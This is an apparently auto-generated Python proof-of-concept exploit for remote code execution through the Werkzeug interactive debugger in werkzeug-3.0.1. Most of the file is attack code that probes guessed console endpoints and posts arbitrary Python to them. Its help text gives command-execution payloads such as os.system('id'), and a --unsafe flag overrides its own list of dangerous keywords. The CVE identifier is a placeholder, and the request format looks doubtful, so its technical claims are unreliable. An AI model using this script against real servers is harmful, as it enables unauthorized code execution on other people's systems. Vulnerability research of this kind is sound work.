#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: rce-019
# Sink: eval
# Auto-generated — run with: python3 rce_python_code_execution_eval_eval_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Werkzeug Debugger RCE (CVE-2023-XXXX)
Target: werkzeug-3.0.1 debugger console endpoint

This script demonstrates unauthenticated remote code execution via the
Werkzeug interactive debugger's eval() sink. The debugger's HTTP endpoint
accepts arbitrary Python code without authentication or input validation.

WARNING: For authorized testing only. Use benign payload by default.
"""

import sys
import requests
import argparse
import urllib.parse

# Default target - change as needed
DEFAULT_TARGET = "http://127.0.0.1:5000"
DEFAULT_PAYLOAD = "print('POC_SUCCESS')"

def exploit(target_url, payload):
    """
    Send arbitrary Python code to the Werkzeug debugger console.
    
    The debugger exposes endpoints like /console or /debugger/console
    that accept POST requests with a 'code' parameter.
    """
    
    # Common debugger endpoint paths to try
    endpoints = [
        "/console",
        "/debugger/console",
        "/__debugger__/console",
        "/werkzeug/console",
    ]
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload: {payload}")
    print("[*] Attempting to reach debugger console...")
    
    session = requests.Session()
    session.timeout = 10
    
    for endpoint in endpoints:
        url = urllib.parse.urljoin(target_url, endpoint)
        print(f"\n[*] Trying: {url}")
        
        try:
            # The debugger console typically accepts POST with 'code' parameter
            response = session.post(
                url,
                data={"code": payload},
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=10
            )
            
            print(f"[*] Status: {response.status_code}")
            print(f"[*] Response length: {len(response.text)} bytes")
            
            # Check for successful execution indicators
            if response.status_code == 200:
                # Look for common debugger response patterns
                if "POC_SUCCESS" in response.text or "executed" in response.text.lower():
                    print("[+] SUCCESS! Code execution confirmed!")
                    print(f"[+] Response snippet: {response.text[:500]}")
                    return True
                elif "Traceback" in response.text or "Error" in response.text:
                    print("[!] Got response but may have error:")
                    print(response.text[:300])
                else:
                    print("[*] Got 200 response - checking content...")
                    print(f"[*] Response preview: {response.text[:200]}")
            elif response.status_code == 404:
                print("[-] Endpoint not found")
            elif response.status_code == 405:
                print("[-] Method not allowed - trying GET...")
                # Some debugger versions accept GET
                response = session.get(url, params={"code": payload}, timeout=10)
                if response.status_code == 200:
                    print("[+] GET request succeeded!")
                    print(f"[+] Response: {response.text[:300]}")
                    return True
            else:
                print(f"[-] Unexpected status: {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection refused to {url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {url}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("\n[-] No working endpoint found")
    return False

def main():
    parser = argparse.ArgumentParser(
        description="Werkzeug Debugger RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t http://target:5000
  %(prog)s -t http://target:5000 -c "import os; os.system('id')"
  %(prog)s -t http://target:5000 -c "open('/tmp/pwned.txt','w').write('pwned')"
        """
    )
    
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    
    parser.add_argument(
        "-c", "--command",
        default=DEFAULT_PAYLOAD,
        help="Python code to execute (default: print POC_SUCCESS)"
    )
    
    parser.add_argument(
        "--unsafe",
        action="store_true",
        help="Allow potentially dangerous commands (default: safe mode)"
    )
    
    args = parser.parse_args()
    
    # Safety check - warn about dangerous commands
    dangerous_keywords = ["os.system", "subprocess", "exec(", "eval(", "__import__"]
    if not args.unsafe:
        for kw in dangerous_keywords:
            if kw in args.command:
                print(f"[!] WARNING: Command contains '{kw}' which may be dangerous")
                print("[!] Use --unsafe flag to execute anyway")
                sys.exit(1)
    
    print("=" * 60)
    print("Werkzeug Debugger RCE Proof-of-Concept")
    print("=" * 60)
    print()
    
    success = exploit(args.target, args.command)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed - target may not be vulnerable")
        print("[*] Ensure the debugger is enabled on the target")
        sys.exit(1)

if __name__ == "__main__":
    main()
